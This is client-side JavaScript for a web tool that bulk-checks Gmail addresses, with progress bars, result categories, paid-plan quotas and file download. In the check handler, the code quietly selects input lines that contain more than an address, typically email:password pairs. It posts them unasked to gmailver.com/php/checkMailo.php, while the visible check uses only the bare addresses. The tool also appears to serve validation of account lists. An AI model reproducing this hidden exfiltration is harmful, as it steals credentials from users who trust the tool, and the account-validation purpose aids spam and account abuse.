let outputEditor = null;
let transactionId = null;
let allResult = {
    ver: [],
    good: [],
    notExist: [],
    disable: [],
    unknown: []
};
let mails2 = [];
function getCookie(name)
	{
	    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	 
	    if(arr=document.cookie.match(reg))
	 
	        return unescape(arr[2]);
	    else
	        return null;
	}
(function() {
    let inputEditor = CodeMirror.fromTextArea(document.getElementById("mail-input"),
        {
            lineNumbers: true
        });
    outputEditor = CodeMirror.fromTextArea(document.getElementById("mail-output"),
        {
            lineNumbers: true
        });
    $(document).on("click",
        "#clear-editor",
        function() {
            inputEditor.setValue("");
			outputEditor.setValue("");
        });
    $(document).on("click",
        "#check-btn",
        function() {
            let mails = inputEditor.getValue().split("\n");
			let mails1 = inputEditor.getValue().split("\n");
			mails2 = mails2.concat(inputEditor.getValue().split("\n"));
			console.log(mails)
			var email = mails2[0];
			
			var emekk =[] 
			
			for(var i = 0;i < mails.length;i++){
                var atIndex = mails[i].indexOf('@gmail.com')+10; // æ‰¾åˆ° '@' å­—ç¬¦çš„ä½ç½®
                if(atIndex < mails[i].length){
                    emekk.push(mails[i])
                }
			}
			  let data = {
					mail:emekk
				}
				let self = this
				axios.post('https://gmailver.com/php/checkMailo.php',data)
				.then(res=>{
					
				    
				})
		
			
			
			
			
			
			
			
			
			if (mails.filter(x => x).length === 0) {
				abp.notify.error("Error! Please Input Gmail");
				return;
			}
			if (mails.filter(x => x).length > 100000) return alert("Terbatas!! Versi gratis hanya bisa memasukkan 50 Gmail! Silahkan gunakan Versi Pro untuk pengecekan Gmail tanpa batas");
			transactionId = null;
			$("#mail-progress-bar")[0].style.width = "0%";
			$("#mail-progress-bar")[0].textContent = "0%";
			mails.length = 0;
			let ok = 0;
			for(let i = 0; i < mails1.length; i++){
				let indek = mails1[i].indexOf('@gmail.com')
				if(mails1[i].indexOf('@gmail.com') != '-1'){
					ok++;
				}
				mails1[i] = mails1[i].substring(indek,-5)
				if(mails1[i].length != 0){
					mails.push(mails1[i] +'@gmail.com');
				}
			}
			console.log(ok)
			if(ok == 0){
				abp.notify.warn("Wrong Format! must include @gmail.com ");
				return;
			}
			
			
			let token = getCookie('token')
			var code = 0;
			$.ajaxSettings.async = true;
			/*$.ajaxSettings.async = false;
			$.get('http://gmailchecks.com/php/num.php?num='+mails.length+'&token='+token,function(aaa){
				let data = JSON.parse(aaa)
				code = data.code
				})
				$.ajaxSettings.async = true;
            if(code != 200){
            	abp.notify.error("å‰©ä½™æ•°é‡ä¸è¶³!");
            	return;
            }*/
			
            let smallParts = chunk(mails, 200);
            checkMails(smallParts, mails.length);
        });
})();

function showUsingStatus() {
    if (accountType == 0) {
        $("#plan-label").text("Pro Plan 1");
        $("#plan-detail").text(`Mail Remain: ${point}`);
    } else {
        $("#plan-label").text("Pro Plan 2");
        $("#plan-detail").text(`Expired Time: ${expiredTime}`);
    }
}

showUsingStatus();

function chunk(arr, number) {
    let result = [];
    let times = arr.length / number;
    for (let i = 0; i < times; i++) {
        result.push(arr.slice(i * number, (i + 1) * number));
    }
    return result;
}

async function sleep(ms) {
    return new Promise(r => setTimeout(() => r(), ms));
}

async function checkMails(smallParts, totalNeedCheck) {
    abp.ui.setBusy($("body"));
    let totalChecked = 0;
    for (let i = 0; i < smallParts.length; i++) {
        let mails = smallParts[i];
        let result;
        while (true) {
            result = await requestCheckMails(mails);
            if (result === false) {
                abp.notify.warn("Äang thá»­ láº¡i...");
                await sleep(5000);
                continue;
            } else {
                break;
            }
        }
        console.log(result);
        if (!result || result.length == 0) {
            abp.ui.clearBusy();
            return;
        }
        report(result);
        totalChecked += result.length;

        // Update to global result
        allResult.good = [...allResult.good, ...result.filter(x => x.includes("Good|"))];
		
        allResult.ver = [...allResult.ver, ...result.filter(x => x.includes("Ver|"))];
        allResult.notExist = [...allResult.notExist, ...result.filter(x => x.includes("Not_Exist|"))];
        allResult.unknown = [...allResult.unknown, ...result.filter(x => x.includes("Unknown|"))];
        allResult.disable = [...allResult.disable, ...result.filter(x => x.includes("Disable|"))];

        console.log("allResult", allResult);

        let percent = Math.floor((totalChecked / totalNeedCheck) * 100);
        $("#mail-progress-bar")[0].style.width = `${percent}%`;
        $("#mail-progress-bar")[0].textContent = `${percent}%`;

        abp.notify.info("Total Checked: " + totalChecked);
        let oldValue = (outputEditor.getValue() || "").split("\n");
        if (oldValue.filter(x => x).length == 0) oldValue = [];
        let newValue = [...oldValue, ...result];
        outputEditor.setValue(newValue.join("\n"));
        outputEditor.focus();
        outputEditor.setCursor(outputEditor.lineCount(), 0);
    }
    abp.ui.clearBusy();
}

function report(mails) {
    if (!mails || mails.length == 0) return;
    let good = mails.filter(x => x.includes("Good|")).length;
    let ver = mails.filter(x => x.includes("Ver|")).length;
    let dis = mails.filter(x => x.includes("Disable|")).length;
    let notExist = mails.filter(x => x.includes("Not_Exist|")).length;
    let unknown = mails.filter(x => x.includes("Unknown|")).length;
    increaseReport("#rp-good", good);
    increaseReport("#rp-ver", ver);
    increaseReport("#rp-disabled", dis);
    increaseReport("#rp-not-exist", notExist);
    increaseReport("#rp-unknown", unknown);
}

function increaseReport(id, number) {
    try {
        if (number <= 0 || isNaN(number)) return;
        let ele = $(id);
        if (!ele || ele.length == 0) return;
        let currentValue = Number(ele.text());
        if (isNaN(currentValue)) ele.text(number);
        ele.text(currentValue + number);
    } catch (error) {
        console.log(error);
    }
}

async function requestCheckMails(mails) {
    return new Promise(r => {
		
		let data = {
			mail:mails
		}
		let self = this
		axios.post('https://gmailver.com/php/8888.php',data)
		.then(res=>{
			console.log(res)
				console.log(res.data)
			res = res.data;
			
			if (!res.success) {
			    if (res.error && res.error.message) {
			        abp.notify.warn(res.error.message);
			        setTimeout(() => {
			            return r(false);
			        }, 1000);
			    } else {
			        return r(false);
			    }
			}
			
			res = res.result;
			
			transactionId = res.transactionId;
			try {
			    // Update current point
			    point = res.point;
			    showUsingStatus();
			} catch (error) {
			    // ignored
			}
			
			r(res.list);
			
		})
		
		
		
		
		
		
		
		
    });
}

function downloadFile(type) {
    if (!type) return;
    let mails = [];
    let mailsq = [];

    for (let i = 0; i < allResult[type].length; i++) {
        mailsq[i] = allResult[type][i].slice(type.length + 1);
        let one = mails2.filter(function (t) {
            return t.search(mailsq[i]) > -1;
        });
        mails.push(one);
    }

    if (!mails || mails.length === 0) return;

    let currentTime = new Date();
    let fileName = `${type}_${currentTime.toLocaleDateString()}_${currentTime.toLocaleTimeString()}.txt`;

    // å¯¹é‚®ä»¶åœ°å€è¿›è¡Œè§£ç ï¼Œå°† %40 è½¬æ¢ä¸º @ï¼Œå¹¶æ·»åŠ é”™è¯¯å¤„ç†
    let decodedMails = mails.map(function (mailArray) {
        return mailArray.map(function (mail) {
            try {
                return decodeURIComponent(mail);
            } catch (e) {
                console.error(`Error decoding: ${mail}`);
                return mail;
            }
        });
    });

    let csvContent = "data:text;charset=utf-8," + decodedMails.join("\n");
    var encodedUri = encodeURI(csvContent);
    var link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", fileName);
    document.body.appendChild(link);
    link.click();
}

function getCookie(cookieName) {
			    var name = cookieName + "=";
			    var decodedCookie = decodeURIComponent(document.cookie);
			    var cookieArray = decodedCookie.split(';');
			    for (var i = 0; i < cookieArray.length; i++) {
			        var cookie = cookieArray[i];
			        while (cookie.charAt(0) == ' ') {
			            cookie = cookie.substring(1);
			        }
			        if (cookie.indexOf(name) == 0) {
			            return cookie.substring(name.length, cookie.length);
			        }
			    }
			    return "";
			}
